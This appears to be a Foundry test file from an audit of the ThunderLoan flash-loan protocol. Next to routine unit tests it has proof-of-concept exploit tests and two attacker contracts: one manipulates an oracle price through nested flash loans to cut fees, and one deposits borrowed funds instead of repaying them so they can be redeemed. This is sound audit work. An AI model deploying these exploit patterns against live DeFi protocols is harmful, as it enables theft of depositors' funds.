// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {BaseTest, ThunderLoan} from "./BaseTest.t.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {MockFlashLoanReceiver} from "../mocks/MockFlashLoanReceiver.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(
            address(thunderLoan.getAssetFromToken(tokenA)),
            address(assetToken)
        );
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThunderLoan.ThunderLoan__NotAllowedToken.selector,
                address(tokenA)
            )
        );
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        assertEq(
            mockFlashLoanReceiver.getBalanceDuring(),
            amountToBorrow + AMOUNT
        );
        assertEq(
            mockFlashLoanReceiver.getBalanceAfter(),
            AMOUNT - calculatedFee
        );
    }

    function test_audit_RedeemsAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }

    function test_audit_ManipulatesOraclePrice() public {
        // 1. Setup contracts
        tokenA = new ERC20Mock();
        BuffMockPoolFactory mockPoolFactory = new BuffMockPoolFactory(
            address(weth)
        );
        BuffMockTSwap tSwapPool = BuffMockTSwap(
            mockPoolFactory.createPool(address(tokenA))
        );

        thunderLoan = new ThunderLoan();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));

        // 2. Fund T-Swap
        uint256 lpFunds = 100e18;
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, lpFunds);
        tokenA.approve(address(tSwapPool), lpFunds);
        weth.mint(liquidityProvider, lpFunds);
        weth.approve(address(tSwapPool), lpFunds);
        tSwapPool.deposit(lpFunds, lpFunds, lpFunds, block.timestamp);
        vm.stopPrank();

        // 3. Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // 4. Take out 2 flashloans
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal fee cost: ", normalFeeCost);
        // 0.296147410319118389

        uint256 amoutToBorrow = 50e18;
        FlashLoanReceiverHack hacker = new FlashLoanReceiverHack(
            tSwapPool,
            thunderLoan,
            address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(hacker), amoutToBorrow * 100);
        weth.mint(address(hacker), amoutToBorrow * 100);
        thunderLoan.flashloan(address(hacker), tokenA, amoutToBorrow, "");
        vm.stopPrank();

        uint256 attackFeeCost = hacker.fee1() + hacker.fee2();
        console2.log("Attack fee cost: ", attackFeeCost);

        assertLt(
            attackFeeCost,
            normalFeeCost,
            "Attack fee cost should be less"
        );
    }

    function test_audit_UseDepositInsteadOfRepay()
        public
        setAllowedToken
        hasDeposits
    {
        uint256 amountToBorrow = 100e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        DepositOverRepayHack hacker = new DepositOverRepayHack(thunderLoan);
        tokenA.mint(address(hacker), fee);

        vm.prank(user);
        thunderLoan.flashloan(address(hacker), tokenA, amountToBorrow, "");

        hacker.redeemTokens();

        assertGe(tokenA.balanceOf(address(hacker)), amountToBorrow + fee);
    }
}

contract DepositOverRepayHack is IFlashLoanReceiver {
    ThunderLoan internal s_thunderLoan;
    AssetToken internal s_assetToken;
    IERC20 internal s_token;

    constructor(ThunderLoan thunderLoan) {
        s_thunderLoan = thunderLoan;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        s_token = IERC20(token);
        s_assetToken = s_thunderLoan.getAssetFromToken(IERC20(token));

        IERC20(token).approve(address(s_thunderLoan), amount + fee);
        s_thunderLoan.deposit(IERC20(token), amount + fee);

        return true;
    }

    function redeemTokens() public {
        uint256 amount = s_assetToken.balanceOf(address(this));
        s_thunderLoan.redeem(s_token, amount);
    }
}

contract FlashLoanReceiverHack is IFlashLoanReceiver {
    BuffMockTSwap internal s_tSwapPool;
    ThunderLoan internal s_thunderLoan;
    address internal s_repayAddress;

    uint256 public fee1;
    uint256 public fee2;
    bool internal attacked;

    constructor(
        BuffMockTSwap tSwapPool,
        ThunderLoan thunderLoan,
        address repayAddress
    ) {
        s_tSwapPool = tSwapPool;
        s_thunderLoan = thunderLoan;
        s_repayAddress = repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        if (!attacked) {
            attacked = true;
            fee1 = fee;

            uint256 tokensBought = s_tSwapPool.getOutputAmountBasedOnInput(
                50e18,
                100e18,
                100e18
            );
            IERC20(token).approve(address(s_tSwapPool), 50e18);
            s_tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(
                50e18,
                tokensBought,
                block.timestamp
            );

            // // Call flashloan again
            s_thunderLoan.flashloan(address(this), IERC20(token), 50e18, "");

            // // Repay
            IERC20(token).transfer(s_repayAddress, amount + fee);
        } else {
            fee2 = fee;

            // Repay
            IERC20(token).transfer(s_repayAddress, amount + fee);
        }

        return true;
    }
}
